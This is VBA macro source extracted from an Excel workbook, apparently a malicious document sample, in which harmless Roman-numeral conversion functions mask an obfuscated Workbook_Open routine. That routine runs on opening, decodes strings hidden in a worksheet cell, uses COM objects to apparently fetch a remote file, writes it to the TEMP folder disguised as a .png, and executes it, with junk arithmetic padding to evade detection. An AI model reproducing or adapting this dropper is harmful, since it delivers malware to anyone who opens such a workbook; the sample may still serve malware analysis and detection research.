Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit
Function RomanToArabic(ByVal roman As String) As _
    Long
Dim i As Integer
Dim ch As String
Dim result As Long
Dim new_value As Long
Dim old_value As Long

    roman = UCase$(roman)
    old_value = 1000

    For i = 1 To Len(roman)
        ' See what the next character is worth.
        ch = Mid$(roman, i, 1)
        Select Case ch
            Case "I"
                new_value = 1
            Case "V"
                new_value = 5
            Case "X"
                new_value = 10
            Case "L"
                new_value = 50
            Case "C"
                new_value = 100
            Case "D"
                new_value = 500
            Case "M"
                new_value = 1000
        End Select

        ' See if this character is bigger
        ' than the previous one.
        If new_value > old_value Then
            ' The new value > the previous one.
            ' Add this value to the result
            ' and subtract the previous one twice.
            result = result + new_value - 2 * old_value
        Else
            ' The new value <= the previous one.
            ' Add it to the result.
            result = result + new_value
        End If

        old_value = new_value
    Next i

    RomanToArabic = result
End Function
Private Function obcd8dd123c16af(r, Optional of3fc7e99883288 As String = ",") As String()
Dim kd75d498761a93fee As Variant
Dim ce174492e762b7d57de() As String
ReDim kd75d498761a93fee(0 To Len(r))
Dim i As Double, j As Double
Dim a3c58b15e4f1436a42163, aa43f6222816e5c6f6e
a3c58b15e4f1436a42163 = r
For i = 1 To Len(r)
aa43f6222816e5c6f6e = InStr(a3c58b15e4f1436a42163, of3fc7e99883288)
     If aa43f6222816e5c6f6e > 0 Then
          kd75d498761a93fee(j) = Left(a3c58b15e4f1436a42163, aa43f6222816e5c6f6e - 1)
          a3c58b15e4f1436a42163 = Mid(a3c58b15e4f1436a42163, aa43f6222816e5c6f6e + 1)
          j = j + 1
     Else
          kd75d498761a93fee(j) = Mid(a3c58b15e4f1436a42163, aa43f6222816e5c6f6e + 1)
          Exit For
     End If
Next
ReDim ce174492e762b7d57de(j)
For i = 0 To j
     ce174492e762b7d57de(i) = kd75d498761a93fee(i)
Next
obcd8dd123c16af = ce174492e762b7d57de
End Function
Sub Workbook_Open()
Dim z3b6f8b8db As Long: z3b6f8b8db = 6
Dim se6239ed31 As String
Dim nc6f67137b2f1c755e1 As Long
Select Case z3b6f8b8db
Case 21 / Int(22 + 7 / 18) / 15
If 27 > 22 Then
Dim topper_x0 As Long
topper_x0 = (18 ^ 4) * 6
Dim topper_m0 As Long
topper_m0 = (topper_x0 / 18) / 25
Else
Dim n_next_m0  As Long
n_next_m0 = ((23 * 9) + 15)
Dim topper_mNext_0 As Long
topper_mNext_0 = (n_next_m0 + 24) ^ 24
End If
Case 11 + (216 - 288) + 14
If 19 > 15 Then
Dim topper_x1 As Long
topper_x1 = (8 ^ 16) / 26
Dim topper_m1 As Long
topper_m1 = (topper_x1 + 20) / 23
Else
Dim n_next_m1  As Long
n_next_m1 = ((5 + 25) + 8)
Dim topper_mNext_1 As Long
topper_mNext_1 = (n_next_m1 + 10) ^ 26
End If
Case 16 + (228 - 336) + 9
If 12 > 7 Then
Dim topper_x2 As Long
topper_x2 = (11 ^ 25) - 12
Dim topper_m2 As Long
topper_m2 = (topper_x2 * 6) / 11
Else
Dim n_next_m2  As Long
n_next_m2 = ((13 - 11) + 28)
Dim topper_mNext_2 As Long
topper_mNext_2 = (n_next_m2 - 19) ^ 28
End If
Case 29 - (6 + 29) - 20
If 5 > 9 Then
Dim topper_x3 As Long
topper_x3 = (4 ^ 5) / 10
Dim topper_m3 As Long
topper_m3 = (topper_x3 * 21) / 10
Else
Dim n_next_m3  As Long
n_next_m3 = ((19 + 24) + 19)
Dim topper_mNext_3 As Long
topper_mNext_3 = (n_next_m3 - 7) ^ 14
End If
Case ((((6 * 8) / 4) * 4) / 8):
Dim topper_x4 As Long
topper_x4 = (28 / 17) / 21 / 28
Dim topper_m4 As Long
topper_m4 = (topper_x4 / 22) / 26
Call v713c89a5dd8da33263(Environ("TEMP") & "\g591bd.png")
Dim topper_z4 As Long
topper_z4 = (6 / 16) * 15 / 24
Dim topper_y4 As Long
topper_y4 = (topper_z4 - 12) / 16
Case 23 - (21 + 12) - 5
If 22 > 5 Then
Dim topper_x5 As Long
topper_x5 = (12 ^ 8) / 12
Dim topper_m5 As Long
topper_m5 = (topper_x5 - 25) / 6
Else
Dim n_next_m5  As Long
n_next_m5 = ((6 + 15) + 25)
Dim topper_mNext_5 As Long
topper_mNext_5 = (n_next_m5 * 7) ^ 10
End If
Case 9 / Int(29 + 9 / 15) / 7
If 11 > 22 Then
Dim topper_x6 As Long
topper_x6 = (16 ^ 26) + 20
Dim topper_m6 As Long
topper_m6 = (topper_x6 * 16) / 6
Else
Dim n_next_m6  As Long
n_next_m6 = ((28 / 19) + 18)
Dim topper_mNext_6 As Long
topper_mNext_6 = (n_next_m6 + 23) ^ 5
End If
Case 13 - (27 + 21) - 7
If 4 > 29 Then
Dim topper_x7 As Long
topper_x7 = (15 ^ 19) - 22
Dim topper_m7 As Long
topper_m7 = (topper_x7 * 20) / 8
Else
Dim n_next_m7  As Long
n_next_m7 = ((12 * 19) + 28)
Dim topper_mNext_7 As Long
topper_mNext_7 = (n_next_m7 / 29) ^ 15
End If
Case 28 / Int(11 + 20 / 23) / 8
If 22 > 8 Then
Dim topper_x8 As Long
topper_x8 = (26 ^ 22) / 27
Dim topper_m8 As Long
topper_m8 = (topper_x8 * 18) / 26
Else
Dim n_next_m8  As Long
n_next_m8 = ((26 + 9) + 4)
Dim topper_mNext_8 As Long
topper_mNext_8 = (n_next_m8 + 13) ^ 14
End If
End Select
End Sub

Private Sub v713c89a5dd8da33263(ByVal m2691a12addaf5b467 As String)
Dim n79bbc1f4c2375eb1d, n947278aec962bcf3469, xef5a3d874f64dff5cbdf
Dim s123a786972563() As String: s123a786972563 = a48bf67654cf79e82(obcd8dd123c16af(ThisWorkbook.Sheets("AQYOH").Range("H105").Value))
Set n79bbc1f4c2375eb1d = CreateObject(s123a786972563(1)): Set n947278aec962bcf3469 = CreateObject(s123a786972563(2)): Set xef5a3d874f64dff5cbdf = CreateObject(s123a786972563(13))
CallByName n79bbc1f4c2375eb1d, s123a786972563(3), 1, s123a786972563(15), s123a786972563(0), False
CallByName n79bbc1f4c2375eb1d, s123a786972563(4), 1, s123a786972563(10), s123a786972563(11)
CallByName n79bbc1f4c2375eb1d, s123a786972563(9), 1
CallByName n947278aec962bcf3469, s123a786972563(3), 1
CallByName n947278aec962bcf3469, s123a786972563(16), 4, 1
CallByName n947278aec962bcf3469, s123a786972563(5), 1, CallByName(n79bbc1f4c2375eb1d, s123a786972563(8), 2)
CallByName n947278aec962bcf3469, s123a786972563(6), 1, m2691a12addaf5b467, 2
CallByName n947278aec962bcf3469, s123a786972563(7), 1
CallByName xef5a3d874f64dff5cbdf, s123a786972563(14), 1, s123a786972563(12), 0, True
End Sub
Private Function a48bf67654cf79e82(ByVal s123a786972563 As Variant) As String()
Dim dbb414bbc99197386831 As Long: Dim ub1553579edcaf As Long: Dim cdc226bbd94b2fbe5ae As String
For ub1553579edcaf = LBound(s123a786972563) To UBound(s123a786972563)
    For dbb414bbc99197386831 = 1 To Len(s123a786972563(ub1553579edcaf)) Step 2
        cdc226bbd94b2fbe5ae = cdc226bbd94b2fbe5ae & Chr(Int(Chr(Int(0 + 3 - 5 - 11 + 8 - 5 + Int(6 / 2) - 7 + 52)) & Chr(Int(0 - 10 - 11 + Int(13 / 8) + 9 - 6 - 9 - 10 + 5 - 5 + 108)) & Mid(s123a786972563(ub1553579edcaf), dbb414bbc99197386831, 2)) - 4)
    Next
    s123a786972563(ub1553579edcaf) = cdc226bbd94b2fbe5ae: cdc226bbd94b2fbe5ae = ""
Next ub1553579edcaf
a48bf67654cf79e82 = s123a786972563
End Function
Public Function FormatRoman(ByVal n As Integer) As String
   If n = 0 Then FormatRoman = "0": Exit Function
      ' There is no roman symbol for 0, but we don't want to return an empty string.
   Const r = "IVXLCDM"              ' roman symbols
   Dim i As Integer: i = Abs(n)
   Dim s As String, p As Integer
   For p = 1 To 5 Step 2
      Dim d As Integer: d = i Mod 10: i = i \ 10
      Select Case d                 ' format a decimal digit
         Case 0 To 3: s = String(d, Mid(r, p, 1)) & s
         Case 4:      s = Mid(r, p, 2) & s
         Case 5 To 8: s = Mid(r, p + 1, 1) & String(d - 5, Mid(r, p, 1)) & s
         Case 9:      s = Mid(r, p, 1) & Mid(r, p + 2, 1) & s
         End Select
      Next
   s = String(i, "M") & s           ' format thousands
   If n < 0 Then s = "-" & s        ' insert sign if negative (non-standard)
   FormatRoman = s
   End Function


Function IsRule(columnName As String) As Boolean
    IsRule = UCase(Left(columnName, 4)) = "RULE"
End Function



INQUEST-PP=macro
